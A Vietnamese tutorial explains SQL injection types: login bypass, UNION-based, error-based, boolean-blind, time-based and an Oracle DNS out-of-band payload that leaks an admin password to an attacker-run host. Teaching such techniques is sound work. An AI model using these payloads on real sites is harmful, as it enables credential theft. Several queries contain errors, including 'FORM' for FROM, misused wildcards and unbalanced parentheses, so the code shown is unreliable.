# Tổng khái SQL Injection (SQLi):

Trước hết , bạn cần phải hiểu được SQL Injection là gì ?Vì sao lại đặt là SQLi ?

SQL là ngôn ngữ lập trình dùng để quản lý các dữ liệu trong Cơ sở dữ liệu , thực chất cũng chỉ là một ngôn ngữ lập trình như C++ ,PHP ,... nhưng nó lại được thực hiện lệnh trong cơ sở dữ liệu 

Injection được dịch ra là tiêm . Nói tóm lại SQL Injection là tấn công vào trong cơ sở dữ liệu , mà cơ sở dữ liệu là nơi mà Server lưu trữ những thông tin cá nhân như password , username , ... dạng dạng thế

Ví dụ cho dễ hình dung hơn , bạn phải đăng nhập username và password ở 1 trang web , khi bạn đăng nhập đúng thì trang web sẽ trả lại bạn thông tin của account đó 

Bạn nhập vào `username: Nguyen Kiet` mà bạn biết là có tồn tại  và một bất khẩu bất kì `password: abcxyz` thì câu lệnh SQL ở phía Server sẽ chạy câu lệnh SQL như sau:

`SELECT * FORM nguoi_dung WHERE username = 'Nguyen Kiet' AND password = 'abcxyz'`

đây là cú pháp tiêu chuẩn của SQL lấy tất cả dữ liệu từ bảng (table) **`nguoi_dung`** với điều kiện là **`username = 'Nguyen Kiet'`** và **`password = 'abcxyz'`** và tất nhiên nó sẽ không trả về gì cả bởi vì trong bảng `nguoi_dung` không có hàng nào với cột `username = Nguyen Kiet` và `password = abcxyz` cả 

Vậy nếu để phải biết cả username và password thì điều đó quá khó khăn , giả sử lúc này phía Back-End nó tồn tại lỗ hổng SQLi , khi bạn nhập vào ô username ở front-end là **test** thì nó sẽ lấy chữ **test** đó ghép vào chuỗi `SELECT * FORM nguoi_dung WHERE username = 'test'` thế này 

Vậy thì sẽ thế nào nếu chúng ta nhập vào `test'-- ` . Lúc này câu lệnh SQL thực thi sẽ là `SELECT * FORM nguoi_dung WHERE username = 'test'--' AND password = 'abcxyz'` .

Ở đây dấu `--` tức là tất cả những ký tự ở phía sau nó đều là comment và Server sẽ không quan tâm đến những comment đó vậy thì lúc này nó chỉ còn thực thi `SELECT * FORM nguoi_dung WHERE username = 'test'` . Server lúc này nó sẽ lục trong database tìm coi dòng nào mà có `username = test` không thôi , không cần quan tâm password ứng với `username:test` đó là gì cả 

Đó là một ví dụ điển hình về SQLi giúp bạn có thể hình dung một cách tổng quát , nói tóm lại , nó sẽ tấn công vào cơ sở dữ liệu và lấy tất cả thông tin trong cái cơ sở dữ liệu đó ra 


# Các dạng SQL Injection thường gặp:

# **1. In-band SQL Injection** 

&nbsp; Trước tiên , In-band có nghĩa ở đây là cùng một kênh , tức là Dữ liệu đi vào (Input/payload) và dữ liệu đi ra (Output/Result) sẽ đều di chuyển trên một con đường và In-band SQLi tức là bạn tiêm lệnh vào trang web và trang web sẽ hiển thị ra kết quả ở ngay chính nó , nó không trả kết quả ra một web khác 

&nbsp; Ở trong In-band SQLi nó sẽ có 2 kỹ thuật khai thác là `UNION-based SQLi` và `Error-based SQLi` 

- `UNION-based SQLi` : đúng như tên gọi của nó , kĩ thuật này sử dụng toán tử `UNION` đê gộp kết quả trả về của hai câu lệnh truy vấn khác nhau lại 

&nbsp; Ví dụ: Ở đây chúng ta có 1 trang web là `shoppe.com` , và trang web này có 2 bảng để lưu một là sản phảm (table name: product) , hai là tài khoản người dùng (table name: users) , khi chúng ta truy cập vào đường dẫn để xem chi tiết một sản phẩm , ví dụ `shoppe.com/item?id=10` chẳng hạn 

&nbsp; Lúc này hệ thống back-end sẽ chạy câu lệnh SQL để lấy thông tin sản phẩm với id=10 ấy : `SELECT ten_san_pham, gia_tien FORM product WHERE id = 10` 

&nbsp; Kết quả màn hình sẽ in ra là: `Tên sản phẩm: Áo thun; Giá tiền: 100.000 Đồng`

&nbsp; Vấn đề xảy ra ở đây , Trang web này bị lỗi SQL Injection, Chúng ta sẽ không nhập số 10 đơn thuần mà sử dụng thêm `UNION` để lấy thêm dữ liệu từ bảng `users` , vậy chúng ta có thể lấy bằng cách nào?

&nbsp; ví dụ nếu chúng ta thực thi câu lệnh: `SELECT ten_san_pham, gia_tien FORM product WHERE id = 10 UNION SELECT username,password FROM users` thì lúc này màn hình sẽ in ra kết quả: `Dòng 1: Áo thun 100.000 Đồng ; Dòng 2: admin 123456; Dòng 3:user1 111111;.....`

&nbsp; Dòng 1: chính là kết quả từ câu lệnh SELECT đầu tiên , từ Dòng 2 trở đi , chính là kết quả trả về từ câu lệnh SELECT thứ 2 , lấy username và password từ bảng `users` 

&nbsp; Và `UNION-based SQLi` chính là thế , bằng cách sử dụng `UNION` chúng ta đã lừa trang web hiển thị danh sách tài khoản và mật khẩu từ bảng `users` tại nơi mà vốn dĩ chỉ dành để hiển thị tên sản phẩm và giá . Đó là bản chất của gộp kết quả 

- `Error-based SQLi` : Nói dễ hiểu thì kĩ thuật này cố tình gây ra lỗi ở phía Database sao cho thông báo lỗi trả về 

&nbsp; Bạn gửi một câu lệnh SQL đúng cú pháp nhưng sai logic (chẳng hạn như ép văn bản sang Int) , Database cố gắng thực hiện lệnh đó nhưng fail -> Nó báo lỗi đó ra màn hình nhưng lại vô tình đi kèm với dữ liệu bạn vừa truy vấn 

&nbsp; Dễ hình dung thì giả sử Database nó đang cố gắng chuyển đổi chữ `abc` thành dạng INT , nhưng chắc chắn là không thể chuyển đổi được -> Nó sẽ trả lại thông báo màn hình rằng : **`Conversion failed when converting the varchar value 'abc' to data type int.`**

&nbsp; Bạn thấy đấy chữ `abc` đã được in ra màn hình cùng với cái form lỗi kia , vậy thì nếu ở đây thay `abc` bằng câu lệnh truy vấn lấy `password` từ bảng `users` `(SELECT password FROM users)` thì kết quả sẽ là: **`Conversion failed when converting the varchar value 'Mat_khau_o_day' to data type int.`**

&nbsp; Giải thích thêm: bởi vì Database sẽ chạy câu lệnh lấy mật khẩu kia trước rồi mới thực hiện chuyển đổi kiểu dữ liệu , nên khi xảy ra lỗi ,cái mật khẩu nó được lấy ra sẵn rồi và in toẹt ra luôn

# **2. Blind SQL Injection**

&nbsp; Blind có nghĩa là mù thì bạn có thể hiểu Blind SQL Injection ở đây có nghĩa tấn công SQL nhưng kết quả nhận về sẽ không có rõ ràng hoặc là không có 

&nbsp; Giả sử In-band , nếu bạn hỏi nó "mật khẩu là gì" thì DB nó sẽ thực hiện truy vấn và sẽ trả lại bạn "123456" nhưng Blind thì khi bạn hỏi nó "mật khẩu là gì" , DB vẫn sẽ thực thi truy vấn nhưng nó sẽ không quăng kết quả "123456" ra cho bạn mà chỉ có thể trả về "success" hoặc "failed" , dạng dạng thế

Kỹ thuật khai thác: 

- Cơ bản nhất `Boolean-based`

&nbsp; VD: 
&nbsp; Giả sử câu lệnh gốc phía Server:

`SELECT * FROM products WHERE id = '$user_input';`

&nbsp; Server được lập trình , nếu câu truy vấn trên có dữ liệu trả về thì in ra màn hình `success` , còn không có dữ liệu trả về từ DB thì in ra màn hình `failed` 

&nbsp; Chúng ta thử truyền vào `1' AND (SELECT substring(password,1,1) FROM users WHERE username = 'admin') = 'a%' --`

&nbsp; Câu truy vấn lúc này: `SELECT * FORM products WHERE id = '1' AND (SELECT substring(password,1,1) FROM users WHERE username = 'admin') = 'a%' -- '` 

&nbsp; Tại DB sẽ kiểm tra 2 vế , Vế 1 : `id = '1'`(Giả sử ID này tồn tại) cho nên -> True 

&nbsp; Nhưng đến Vế 2: `(SELECT substring(password,1,1) FROM users WHERE username = 'admin') = 'a%'` , nếu ký tự đầu tiên của `password` ứng với `username` là `admin` là chữ `a` -> True 

&nbsp; Tổng hợp lại True AND True thì lúc này DB sẽ trả về dòng dữ liệu cho Server mà Server nhận được dữ liệu cho nên in ra màn hình là `success` -> thế là chúng ta đã biết được kí tự đầu tiên của password admin là chữ `a` , áp dụng với các ký tự ở sau -> sẽ tìm ra được password


- `Time-based`: Khi mà trang web không trả về bất kì dữ liệu nào ở phía Client thì chúng ta có thể sử dụng độ trễ của thời gian phản hồi trang web làm thước đo đúng sai 

&nbsp; Câu lệnh truy vấn gốc:`SELECT * FROM products WHERE id = '$user_input'` 

&nbsp; Chúng ta sẽ truyền thử:

 `1' AND IF ((SELECT substring(password,1,1) FROM user WHERE username = 'admin') = '%a'),sleep(5),0) --`

&nbsp; Lúc này câu truy vấn sẽ là: 

`SELECT * FROM products WHERE id = '1' AND IF ((SELECT substring(password,1,1) FROM user WHERE username = 'admin') = '%a'),sleep(5),0) --'`

&nbsp; Giải thích : Database kiểm tra id = 1 -> Có -> True 

&nbsp; Tiếp tục check vế sau: Nếu kí tự đầu tiên của password tương ứng với username là `admin` bắt đầu bằng chữu `a` -> TH1: Load web trong 5s -> kết luận được đó là chữ `a` rồi ; TH2: nếu sai -> trả về 0 -> trang web load xong ngay lập tức


- `Out-of-band`: Kỹ thuật này khai thác lỗ hổng bằng cách sử dụng các kênh thay thế để lấy dữ liệu từ bên ngoài 

&nbsp; Hình dung, bạn có 1 trang web `test.com` , trang web có khả năng ghi lại các yêu cầu mà nó nhận được (chạy dịch vụ DNS Server bên trong)

&nbsp; Câu lệnh truy vấn gốc phía Server nạn nhân: `SELECT * FROM users WHERE id ='$user_input'`

&nbsp; Thử truyền vào:

`' || (SELECT UTL_INADDR.GET_HOST_ADDRESS(password ||'.test.com') FROM users WHERE username = 'admin') || '`

&nbsp; Lệnh truy vấn sẽ thực thi:

`SELECT * FROM users WHERE id ='' || (SELECT UTL_INADDR.GET_HOST_ADDRESS(SELECT password FROM users WHERE username = 'admin'||'.test.com')) || ''`


&nbsp; Giải thích: đây là cú pháp áp dụng với hệ quản trị CSDL Oracle

- `UTL_INADDR`: một gói có sẵn trong Oracle cung cấp các hàm để truy cập thông tin mạng

- `GET_HOST_ADDRESS`: hàm này có chức năng lấy địa chỉ IP của tên miền 

- Dấu `||` là dấu nối chuối trong Database Oracle 

&nbsp; Để câu truy vấn trên thực thi , đầu tiên DB sẽ phải xác định được `id` , vế đầu tiên `id` = rỗng , vế tiếp theo sau dấu `||` , `SELECT password FROM users WHERE username = 'admin'` sẽ chạy và lấy ra được mật khẩu ví dụ là `123456` 

&nbsp; Rồi nối chuỗi với `.test.com` kết quả sẽ là: `123456.test.com` 

&nbsp; Tiếp tục Database cần tìn địa chỉ IP của `123456.test.com` cho nên sẽ gửi một truy vấn DNS đến DNS Server của `test.com` 

&nbsp; Lúc này tại file log Server `test.com` (tức Server bạn) sẽ bắt được hành động từ Database , khi mở file log lên thì nó có dạng:

```
Dec 20 10:00:02 ns1 named[1234]: client @0x7f.. 113.161.99.99#41233: query: 123456.test.com IN A + (100.200.1.1)
```
&nbsp; Và bạn nhìn thấy được dòng `123456.test.com` và `123456` đó chính là password của `admin` 


